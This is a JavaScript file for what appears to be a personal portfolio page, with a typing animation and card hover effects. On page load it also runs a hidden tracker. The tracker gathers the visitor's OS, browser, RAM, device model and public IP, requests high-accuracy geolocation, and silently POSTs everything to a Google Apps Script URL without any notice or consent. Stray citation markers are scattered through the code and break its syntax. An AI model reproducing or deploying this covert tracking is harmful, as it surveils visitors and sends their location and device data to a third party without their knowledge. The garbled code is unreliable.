(async function() {
  // === 1. KONFIGURASI ===
  [cite_start]const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwzuzL8rDox4yDpNoOoUUtAI-Nx7BnmrjA-CkP5V_seQ-hYGFhuQ-Zf4l6YmIUJ6SR6mA/exec"; [cite: 16]

  // === 2. DETEKSI OS, BROWSER, & ENGINE DETAIL ===
  const getDetailedSpecs = () => {
    [cite_start]const ua = navigator.userAgent; [cite: 16]
    [cite_start]let osDetail = "Unknown OS"; [cite: 16]
    [cite_start]let browserDetail = "Unknown Browser"; [cite: 16]
    [cite_start]let engine = "Unknown Engine"; [cite: 16]

    [cite_start]if (/WebKit/i.test(ua)) engine = "WebKit"; [cite: 16]
    [cite_start]if (/Gecko/i.test(ua) && !/WebKit/i.test(ua)) engine = "Gecko"; [cite: 16]
    [cite_start]if (/Chrome/i.test(ua)) engine = "Blink"; [cite: 16]

    [cite_start]if (/iPhone|iPad|iPod/.test(ua)) { [cite: 17]
      [cite_start]const v = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/)); [cite: 17]
      osDetail = `iOS ${v[1]}.${v[2]}.${v[3] || [cite_start]'0'}`; [cite: 17]
    [cite_start]} else if (/Android/.test(ua)) { [cite: 17]
      [cite_start]const v = (ua.match(/Android (\d+)/)); [cite: 17]
      [cite_start]osDetail = `Android ${v ? v[1] : 'Unknown'}`; [cite: 17]
    [cite_start]} else if (/Windows NT/.test(ua)) { [cite: 17]
      [cite_start]const v = ua.match(/Windows NT (\d+\.\d+)/); [cite: 18]
      [cite_start]const winMap = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"}; [cite: 18]
      [cite_start]osDetail = `Windows ${winMap[v[1]] || v[1]}`; [cite: 18]
    } else {
      [cite_start]osDetail = navigator.platform; [cite: 19]
    }

    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident|edg(?=\/))\/?\s*(\d+)/i) || [cite_start][]; [cite: 20]
    let name = M[1] ? [cite_start]M[1].toLowerCase() : "Unknown"; [cite: 21]
    let version = M[2] || [cite_start]"0"; [cite: 21]
    [cite_start]if (name === 'edg') name = 'Edge'; [cite: 22]
    [cite_start]if (name === 'trident') name = 'IE'; [cite: 22]
    [cite_start]browserDetail = `${name.charAt(0).toUpperCase() + name.slice(1)} ${version} (${engine})`; [cite: 23]

    return { osDetail, browserDetail };
  };

  // === 3. DETEKSI MODEL SMARTPHONE (iOS & ANDROID) ===
  const getDeviceModel = () => {
    [cite_start]const ua = navigator.userAgent; [cite: 25]
    [cite_start]const w = window.screen.width; [cite: 24]
    [cite_start]const h = window.screen.height; [cite: 25]

    // Deteksi iPhone (Berdasarkan Resolusi)
    [cite_start]if (/iPhone|iPad|iPod/.test(ua)) { [cite: 25]
      const models = {
        "442:960": "iPhone 17 Pro Max",
        "404:880": "iPhone 17 Pro",
        [cite_start]"440:956": "iPhone 16 Pro Max", [cite: 26]
        [cite_start]"402:874": "iPhone 16 Pro", [cite: 26]
        [cite_start]"430:932": "iPhone 15/16 Plus / 14 Pro Max", [cite: 26]
        [cite_start]"393:852": "iPhone 15/16 / 14 Pro", [cite: 26]
        [cite_start]"390:844": "iPhone 12/13/14", [cite: 26]
        [cite_start]"428:926": "iPhone 12/13/14 Pro Max", [cite: 26]
        [cite_start]"414:896": "iPhone 11/XR/XS Max", [cite: 26]
        [cite_start]"375:812": "iPhone X/XS/11Pro", [cite: 26]
        [cite_start]"375:667": "iPhone SE/6/7/8", [cite: 26]
        [cite_start]"414:736": "iPhone 6/7/8 Plus" [cite: 26]
      };
      return models[`${w}:${h}`] || [cite_start]"Apple iPhone"; [cite: 27]
    }

    // Deteksi Android (Berdasarkan User Agent Hint & String)
    if (/Android/.test(ua)) {
      // Mencoba mengambil brand dari User Agent Data (Browser Baru)
      if (navigator.userAgentData && navigator.userAgentData.mobile) {
        return navigator.userAgentData.brands.map(b => b.brand).join(" ");
      }
      // Metode User Agent String (Umum)
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      if (match) return match[1];
      
      const modelSimple = ua.match(/\(([^;]+);/);
      return modelSimple ? modelSimple[1] : "Android Device";
    }

    [cite_start]return navigator.platform; [cite: 25]
  };

  // === 4. TRACKING ENGINE ===
  const startTracker = async () => {
    [cite_start]const specs = getDetailedSpecs(); [cite: 27]
    let payload = {
      [cite_start]ip: "Checking...", [cite: 28]
      [cite_start]osDetail: specs.osDetail, [cite: 28]
      [cite_start]browserDetail: specs.browserDetail, [cite: 28]
      [cite_start]ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A", [cite: 28, 29]
      [cite_start]deviceName: getDeviceModel(), [cite: 29]
      [cite_start]lat: null, long: null [cite: 29]
    };

    try {
      [cite_start]const res = await fetch('https://api.ipify.org?format=json'); [cite: 30]
      [cite_start]const d = await res.json(); [cite: 31]
      [cite_start]payload.ip = d.ip; [cite: 31]
    } catch (e) { 
      [cite_start]payload.ip = "Hidden/VPN"; [cite: 31]
    }

    const sendData = (data) => {
      [cite_start]fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) }); [cite: 32]
    };

    [cite_start]if (navigator.geolocation) { [cite: 33]
      [cite_start]navigator.geolocation.getCurrentPosition((pos) => { [cite: 33]
        [cite_start]payload.lat = pos.coords.latitude; [cite: 33]
        [cite_start]payload.long = pos.coords.longitude; [cite: 33]
        [cite_start]sendData(payload); [cite: 33]
      }, () => {
        [cite_start]sendData(payload); [cite: 33]
      [cite_start]}, { enableHighAccuracy: true }); [cite: 33]
    } else {
      [cite_start]sendData(payload); [cite: 34]
    }
  };

  // === 5. UI EFFECTS (TYPING) ===
  [cite_start]const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast']; [cite: 35]
  [cite_start]let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150; [cite: 36]

  [cite_start]function typeText() { [cite: 37]
    [cite_start]const typedElement = document.getElementById('typed-text'); [cite: 37]
    [cite_start]if (!typedElement) return; [cite: 37]
    [cite_start]const currentText = texts[textIndex]; [cite: 37]

    [cite_start]if (isDeleting) { [cite: 38]
      [cite_start]typedElement.textContent = currentText.substring(0, charIndex - 1); [cite: 38]
      [cite_start]charIndex--; typingDelay = 75; [cite: 38]
    [cite_start]} else { [cite: 39]
      [cite_start]typedElement.textContent = currentText.substring(0, charIndex + 1); [cite: 39]
      [cite_start]charIndex++; typingDelay = 150; [cite: 39]
    }

    [cite_start]if (!isDeleting && charIndex === currentText.length) { [cite: 40]
      [cite_start]typingDelay = 2000; [cite: 40]
      [cite_start]isDeleting = true; [cite: 41]
    [cite_start]} else if (isDeleting && charIndex === 0) { [cite: 41]
      [cite_start]isDeleting = false; [cite: 41]
      [cite_start]textIndex = (textIndex + 1) % texts.length; [cite: 42]
      [cite_start]typingDelay = 500; [cite: 42]
    }
    [cite_start]setTimeout(typeText, typingDelay); [cite: 42]
  }

  // === 6. INITIALIZE ALL ===
  [cite_start]window.addEventListener('load', () => { [cite: 43]
    [cite_start]startTracker(); [cite: 43]
    [cite_start]setTimeout(typeText, 1000); [cite: 43]

    [cite_start]document.querySelectorAll('.card').forEach(card => { [cite: 43]
      [cite_start]card.addEventListener('mousemove', (e) => { [cite: 43]
        [cite_start]const rect = card.getBoundingClientRect(); [cite: 43]
        [cite_start]const x = ((e.clientX - rect.left) / rect.width) * 100; [cite: 43]
        [cite_start]const y = ((e.clientY - rect.top) / rect.height) * 100; [cite: 43]
        const inner = card.querySelector('.card-inner');
        if (inner) {
          [cite_start]inner.style.setProperty('--x', `${x}%`); [cite: 43]
          [cite_start]inner.style.setProperty('--y', `${y}%`); [cite: 44]
        }
      });
    });
  });
})();
